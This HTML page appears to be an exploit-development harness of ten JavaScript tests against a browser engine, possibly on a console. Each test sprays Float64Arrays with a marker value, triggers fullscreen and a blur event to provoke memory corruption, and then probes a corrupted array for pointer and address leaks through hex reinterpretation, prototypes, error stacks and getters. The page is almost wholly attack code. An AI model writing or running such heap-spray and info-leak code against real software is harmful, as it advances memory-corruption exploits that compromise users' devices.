
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Info Leak Battery</title>
</head>
<body>

<h1>INFO LEAK - 10 TESTS</h1>

<h2>TEST 1: Leak via Object Properties</h2>
<button onclick="t1()">RUN</button>
<div id="r1"></div>
<script>
function t1() {
    const r = document.getElementById('r1');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'Leaking object properties:<br>';
        
        // Check buffer property
        r.innerHTML += 'buffer: ' + (c.buffer ? 'EXISTS' : 'null') + '<br>';
        r.innerHTML += 'byteLength: ' + c.byteLength + '<br>';
        r.innerHTML += 'byteOffset: ' + c.byteOffset + '<br>';
        r.innerHTML += 'length: ' + c.length + '<br>';
        
        // Try accessing buffer properties
        if(c.buffer) {
            r.innerHTML += 'buffer.byteLength: ' + c.buffer.byteLength + '<br>';
            
            // Try to leak buffer address via toString
            const bufStr = c.buffer.toString();
            r.innerHTML += 'buffer.toString(): ' + bufStr + '<br>';
        }
        
        // Check constructor
        r.innerHTML += 'constructor: ' + c.constructor.name + '<br>';
        
        // Try valueOf
        const val = c.valueOf();
        r.innerHTML += 'valueOf(): ' + val + '<br>';
    };
}
</script>

<hr>

<h2>TEST 2: Leak via Prototype Chain</h2>
<button onclick="t2()">RUN</button>
<div id="r2"></div>
<script>
function t2() {
    const r = document.getElementById('r2');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'Prototype chain leak:<br>';
        
        // Walk prototype chain
        let proto = Object.getPrototypeOf(c);
        r.innerHTML += 'proto: ' + proto.constructor.name + '<br>';
        
        let proto2 = Object.getPrototypeOf(proto);
        r.innerHTML += 'proto2: ' + proto2.constructor.name + '<br>';
        
        // Check for methods
        const methods = Object.getOwnPropertyNames(proto);
        r.innerHTML += 'Methods: ' + methods.length + '<br>';
        
        // Try to leak method addresses via toString
        if(methods.includes('set')) {
            const setFunc = proto.set;
            r.innerHTML += 'set: ' + setFunc.toString().substring(0, 50) + '...<br>';
        }
    };
}
</script>

<hr>

<h2>TEST 3: Leak via Error Stack</h2>
<button onclick="t3()">RUN</button>
<div id="r3"></div>
<script>
function t3() {
    const r = document.getElementById('r3');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'Error stack leak:<br>';
        
        try {
            c[999999999] = 1;
        } catch(e) {
            r.innerHTML += 'Error: ' + e.message + '<br>';
            if(e.stack) {
                const lines = e.stack.split('\n');
                r.innerHTML += 'Stack lines: ' + lines.length + '<br>';
                
                for(let i = 0; i < Math.min(5, lines.length); i++) {
                    r.innerHTML += lines[i] + '<br>';
                }
            }
        }
    };
}
</script>

<hr>

<h2>TEST 4: Leak via Array Iteration</h2>
<button onclick="t4()">RUN</button>
<div id="r4"></div>
<script>
function t4() {
    const r = document.getElementById('r4');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'Array iteration leak:<br>';
        
        const leaks = [];
        
        // Iterate and convert each value
        for(let i = 0; i < c.length; i++) {
            const val = c[i];
            const buf = new ArrayBuffer(8);
            new Float64Array(buf)[0] = val;
            const hex = new BigUint64Array(buf)[0];
            
            leaks.push({idx: i, hex: hex});
            
            // Check if looks like pointer
            if(hex > 0x100000000n && hex < 0x7FFFFFFFFFFFn && (hex & 0x7n) === 0n) {
                r.innerHTML += i + ': 0x' + hex.toString(16) + ' <b>PTR</b><br>';
            }
        }
        
        // Check for NaN tagged pointers
        for(let l of leaks) {
            if((l.hex & 0xFFFF000000000000n) === 0xFFFF000000000000n) {
                r.innerHTML += l.idx + ': 0x' + l.hex.toString(16) + ' <b>NaN-TAGGED</b><br>';
            }
        }
    };
}
</script>

<hr>

<h2>TEST 5: Leak via Subarray</h2>
<button onclick="t5()">RUN</button>
<div id="r5"></div>
<script>
function t5() {
    const r = document.getElementById('r5');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'Subarray leak:<br>';
        
        try {
            const sub = c.subarray(0, 4);
            r.innerHTML += 'Subarray created<br>';
            r.innerHTML += 'sub.length: ' + sub.length + '<br>';
            r.innerHTML += 'sub.byteOffset: ' + sub.byteOffset + '<br>';
            r.innerHTML += 'sub.buffer === c.buffer: ' + (sub.buffer === c.buffer) + '<br>';
            
            // Check if shares same buffer
            c[2] = 1.23456;
            r.innerHTML += 'sub[2] after modify: ' + sub[2] + '<br>';
            
            if(sub[2] === 1.23456) {
                r.innerHTML += '<b>SHARED BUFFER</b><br>';
            }
        } catch(e) {
            r.innerHTML += 'Error: ' + e.message + '<br>';
        }
    };
}
</script>

<hr>

<h2>TEST 6: Leak via Object.keys</h2>
<button onclick="t6()">RUN</button>
<div id="r6"></div>
<script>
function t6() {
    const r = document.getElementById('r6');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'Object.keys leak:<br>';
        
        const keys = Object.keys(c);
        r.innerHTML += 'Keys: ' + keys.length + '<br>';
        r.innerHTML += 'First 10: ' + keys.slice(0, 10).join(', ') + '<br>';
        
        // Get all property descriptors
        const props = Object.getOwnPropertyNames(c);
        r.innerHTML += 'Properties: ' + props.length + '<br>';
        
        // Check for hidden properties
        const symbols = Object.getOwnPropertySymbols(c);
        r.innerHTML += 'Symbols: ' + symbols.length + '<br>';
    };
}
</script>

<hr>

<h2>TEST 7: Leak via JSON.stringify</h2>
<button onclick="t7()">RUN</button>
<div id="r7"></div>
<script>
function t7() {
    const r = document.getElementById('r7');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'JSON.stringify leak:<br>';
        
        try {
            const json = JSON.stringify(c);
            r.innerHTML += 'Length: ' + json.length + '<br>';
            r.innerHTML += 'Preview: ' + json.substring(0, 100) + '...<br>';
            
            // Parse back
            const parsed = JSON.parse(json);
            r.innerHTML += 'Parsed length: ' + parsed.length + '<br>';
            
            // Check values
            let matches = 0;
            for(let i = 0; i < Math.min(c.length, parsed.length); i++) {
                if(c[i] === parsed[i]) matches++;
            }
            r.innerHTML += 'Matches: ' + matches + '/' + c.length + '<br>';
        } catch(e) {
            r.innerHTML += 'Error: ' + e.message + '<br>';
        }
    };
}
</script>

<hr>

<h2>TEST 8: Leak via WeakMap</h2>
<button onclick="t8()">RUN</button>
<div id="r8"></div>
<script>
function t8() {
    const r = document.getElementById('r8');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    const wm = new WeakMap();
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
        wm.set(a, i);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'WeakMap leak:<br>';
        
        const wmValue = wm.get(c);
        r.innerHTML += 'WeakMap value: ' + wmValue + '<br>';
        
        if(wmValue !== undefined) {
            r.innerHTML += '<b>IDENTITY PRESERVED</b><br>';
        } else {
            r.innerHTML += 'Identity lost (expected)<br>';
        }
        
        // Try to set new value
        wm.set(c, 0xBEEF);
        const newValue = wm.get(c);
        r.innerHTML += 'New value: ' + newValue + '<br>';
    };
}
</script>

<hr>

<h2>TEST 9: Leak via Getter Trap</h2>
<button onclick="t9()">RUN</button>
<div id="r9"></div>
<script>
function t9() {
    const r = document.getElementById('r9');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'Getter trap leak:<br>';
        
        const arr = Array.from(c);
        
        let leaked = null;
        
        Object.defineProperty(arr, '5', {
            get: function() {
                leaked = this;
                r.innerHTML += 'Getter called<br>';
                return 0x1337;
            }
        });
        
        const val = arr[5];
        r.innerHTML += 'Value: 0x' + val.toString(16) + '<br>';
        
        if(leaked) {
            r.innerHTML += 'Leaked this: ' + leaked.constructor.name + '<br>';
            r.innerHTML += 'Length: ' + leaked.length + '<br>';
        }
    };
}
</script>

<hr>

<h2>TEST 10: Leak via Function.caller</h2>
<button onclick="t10()">RUN</button>
<div id="r10"></div>
<script>
function t10() {
    const r = document.getElementById('r10');
    r.innerHTML = 'Press OPTIONS<br>';
    
    const arrays = [];
    const P = 2.121995791e-314;
    
    for(let i = 0; i < 5000; i++) {
        let a = new Float64Array(8);
        a[0] = i;
        arrays.push(a);
    }
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    window.onblur = function() {
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            let s = new Float64Array(10);
            s.fill(P);
            spray.push(s);
        }
        
        let c = null;
        for(let a of arrays) {
            if(a[0] === P) { c = a; break; }
        }
        
        if(!c) { r.innerHTML = 'FAIL<br>'; return; }
        
        r.innerHTML = 'Function.caller leak:<br>';
        
        const arr = Array.from(c);
        
        Object.setPrototypeOf(arr, {
            leak: function inner() {
                r.innerHTML += 'Function called<br>';
                
                try {
                    const caller = arguments.callee.caller;
                    r.innerHTML += 'Caller: ' + caller + '<br>';
                } catch(e) {
                    r.innerHTML += 'Caller error: ' + e.message + '<br>';
                }
                
                try {
                    const stack = new Error().stack;
                    if(stack) {
                        const lines = stack.split('\n');
                        r.innerHTML += 'Stack depth: ' + lines.length + '<br>';
                        for(let i = 0; i < Math.min(3, lines.length); i++) {
                            r.innerHTML += lines[i] + '<br>';
                        }
                    }
                } catch(e) {
                    r.innerHTML += 'Stack error: ' + e.message + '<br>';
                }
                
                return 'LEAKED';
            }
        });
        
        const result = arr.leak();
        r.innerHTML += 'Result: ' + result + '<br>';
    };
}
</script>

<p>Execute all 10, send key findings</p>

</body>
</html>
